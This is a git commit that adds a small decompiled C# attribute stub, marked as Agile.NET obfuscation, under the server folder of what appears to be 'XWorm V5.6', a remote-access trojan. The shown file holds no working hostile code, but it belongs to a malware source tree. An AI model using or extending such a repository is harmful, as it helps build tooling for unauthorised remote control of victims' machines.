e5b4fae155b14aa46e1814d369c9a9e62afb6e57
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:52:57 +0400

    ObfuscatedByAgileDotNetAttribute.cs

---
+++ XWorm V5.6/Server/Obfuscator/ObfuscatedByAgileDotNetAttribute.cs
@@ -0,0 +1,9 @@
+﻿using System;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+internal class SecureTeam\u002EAttributes\u002EObfuscatedByAgileDotNetAttribute : Attribute
+{
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  public SecureTeam\u002EAttributes\u002EObfuscatedByAgileDotNetAttribute([In] string obj0) => throw new Exception("し");
+}
